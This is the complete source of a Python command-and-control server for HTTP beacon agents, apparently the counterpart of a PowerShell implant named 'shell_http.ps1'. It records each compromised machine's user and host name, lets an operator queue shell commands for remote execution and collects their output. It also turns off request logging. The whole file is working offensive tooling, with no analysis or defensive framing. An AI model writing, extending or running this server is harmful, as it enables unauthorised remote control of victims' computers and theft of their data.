#!/usr/bin/env python3
"""
HTTP Beacon C2 Server
Receives beacons from shell_http.ps1 agents
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import threading
from datetime import datetime
from collections import defaultdict

PORT = 8080
sessions = {}  # id -> session info
pending_commands = defaultdict(list)  # id -> [commands]
output_buffer = defaultdict(list)  # id -> [outputs]

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging

    def do_POST(self):
        if self.path == "/beacon":
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length).decode())

            agent_id = data.get('id', 'unknown')
            now = datetime.now().strftime("%H:%M:%S")

            # Register/update session
            if agent_id not in sessions:
                print(f"\n[{now}] NEW AGENT: {agent_id} | {data.get('user')} @ {data.get('host')}")
                sessions[agent_id] = {
                    'user': data.get('user'),
                    'host': data.get('host'),
                    'first_seen': now,
                    'last_seen': now
                }
            else:
                sessions[agent_id]['last_seen'] = now

            # Store output if present
            if data.get('data'):
                output_buffer[agent_id].append(data['data'])
                # Print output if we're interacting with this agent
                if hasattr(self.server, 'active_agent') and self.server.active_agent == agent_id:
                    print(data['data'])

            # Send pending command
            response = {}
            if pending_commands[agent_id]:
                response['cmd'] = pending_commands[agent_id].pop(0)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def command_loop(server):
    print(f"""
╔═══════════════════════════════════════════╗
║         HTTP BEACON C2 - Port {PORT}        ║
╠═══════════════════════════════════════════╣
║  Commands:                                ║
║    agents     - List connected agents     ║
║    use <id>   - Select agent              ║
║    cmd <cmd>  - Queue command             ║
║    output     - Show buffered output      ║
║    exit       - Quit C2                   ║
╚═══════════════════════════════════════════╝
""")
    server.active_agent = None

    while True:
        try:
            prompt = f"({server.active_agent}) " if server.active_agent else ""
            cmd = input(f"{prompt}http-c2> ").strip()

            if not cmd:
                continue
            elif cmd == "agents":
                if not sessions:
                    print("No agents connected")
                else:
                    print("\n=== Connected Agents ===")
                    for aid, info in sessions.items():
                        print(f"  [{aid}] {info['user']} @ {info['host']} | Last: {info['last_seen']}")
                    print()
            elif cmd.startswith("use "):
                aid = cmd[4:].strip()
                if aid in sessions:
                    server.active_agent = aid
                    print(f"[*] Now interacting with {aid}")
                else:
                    print(f"[-] Agent not found: {aid}")
            elif cmd.startswith("cmd "):
                if not server.active_agent:
                    print("[-] No agent selected. Use 'use <id>' first")
                else:
                    pending_commands[server.active_agent].append(cmd[4:])
                    print(f"[+] Command queued for {server.active_agent}")
            elif cmd == "output":
                if server.active_agent and output_buffer[server.active_agent]:
                    print("\n".join(output_buffer[server.active_agent]))
                else:
                    print("No output buffered")
            elif cmd == "exit":
                print("[*] Shutting down...")
                break
            elif server.active_agent:
                # Direct command if agent selected
                pending_commands[server.active_agent].append(cmd)
                print(f"[+] Queued: {cmd}")
            else:
                print(f"[-] Unknown: {cmd}")
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Exiting...")
            break

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', PORT), C2Handler)
    print(f"[*] HTTP C2 listening on port {PORT}...")

    # Run HTTP server in background
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    # Command loop in foreground
    command_loop(server)
    server.shutdown()
